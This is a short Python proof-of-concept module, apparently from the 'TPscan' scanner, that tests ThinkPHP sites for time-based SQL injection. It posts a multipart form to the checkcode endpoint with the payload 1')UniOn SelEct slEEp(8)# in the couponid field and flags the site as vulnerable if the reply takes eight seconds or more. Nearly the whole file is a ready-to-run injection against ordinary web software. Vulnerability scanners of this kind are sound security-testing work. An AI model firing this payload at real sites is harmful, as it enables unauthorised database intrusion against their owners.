#!/usr/bin/env python
# coding=utf-8
import time
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "TPscan",
    "DNT": "1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Content-Type": "multipart/form-data; boundary=--------641902708",
    "Accept-Encoding": "gzip, deflate, sdch",
    "Accept-Language": "zh-CN,zh;q=0.8",
}

payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--"


async def thinkphp_checkcode_time_sqli_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        start_time = time.time()
        url = urljoin(url, 'index.php?s=/home/user/checkcode/')
        resp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
        if time.time() - start_time >= 8:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['payload'] = payload
            pocdict['proof'] = 'time sleep 8'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
